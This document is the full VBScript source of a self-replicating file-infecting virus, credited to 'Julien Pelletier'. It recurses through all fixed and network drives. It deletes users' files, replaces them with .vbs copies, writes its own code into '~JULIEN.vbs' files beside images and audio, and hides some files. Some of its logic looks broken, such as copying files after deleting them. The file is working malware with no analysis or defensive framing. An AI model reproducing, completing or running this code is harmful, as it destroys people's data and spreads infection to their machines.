rem  barok -JULIEN(vbe) <French Resistance>
rem                     by: Julien Pelletier  /  
On Error Resume Next
dim fso,eq,ctr,file,vbscopy
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,s,bname,wav
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
if(ext="jpg") or (ext="jpeg") or (ext="gif") or (ext="bmp")then
set ap=fso.OpenTextFile(f1.path&"~JULIEN"&".vbs")
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&"~JULIEN"&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="wav") or (ext="mp3") or (ext="mid") then
set wav=fso.CreateTextFile(f1.path&"~JULIEN"&".vbs")
wav.write vbscopy
wav.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub